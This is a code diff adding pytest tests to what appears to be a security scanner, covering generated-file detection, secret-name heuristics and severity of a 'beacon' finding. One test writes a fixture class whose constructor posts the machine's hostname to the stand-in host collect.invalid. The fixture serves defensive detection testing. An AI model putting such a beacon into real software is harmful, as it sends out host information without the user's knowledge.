@@ -13808,3 +13808,54 @@ class TestAConstructorRunsWhenItsClassIsBuilt:
     def test_one_built_at_import_is_not(self, tmp_path) -> None:
         found = self._beacon(tmp_path, self.SOURCE + "Tracker('collect.invalid')\n")
         assert any(f.severity >= Severity.HIGH for f in found)
+
+
+class TestViteBundlesAreBuildOutput:
+    def test_a_vite_chunk_is_generated(self) -> None:
+        from cordon_scanner.detect.secrets import is_generated_artefact
+
+        assert is_generated_artefact("streamlit/static/static/js/katex.B0YdJus7.js")
+
+    def test_ordinary_names_are_not(self) -> None:
+        from cordon_scanner.detect.secrets import is_generated_artefact
+
+        for path in (
+            "src/react.development.js",
+            "lib/lodash.es2015.js",
+            "src/useEffect.js",
+            "a/b/Utils.v2Helper.js",
+        ):
+            assert not is_generated_artefact(path), path
+
+
+class TestTheNameOfASecretsNamespace:
+    def test_a_namespace_label_is_not_a_secret(self) -> None:
+        from cordon_scanner.detect.secrets import names_identifier
+
+        assert names_identifier("_SECRET_NAMESPACE")
+        assert names_identifier("SECRET_PREFIX")
+        assert not names_identifier("SECRET_KEY")
+        assert not names_identifier("secret_id")
+
+
+class TestTheLoadPathSkipsTheScriptBlock:
+    def test_a_beacon_built_only_under_main_is_on_request(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "tracker.py").write_text(
+            "import socket, requests\n"
+            "class Tracker:\n"
+            "    def __init__(self, url):\n"
+            "        requests.post(url, json={'host': socket.gethostname()})\n"
+            "if __name__ == '__main__':\n    Tracker('https://collect.invalid')\n",
+            encoding="utf-8",
+        )
+        found = [
+            f
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if "BEACON" in f.rule_id
+        ]
+        assert all(f.severity <= Severity.MEDIUM for f in found)
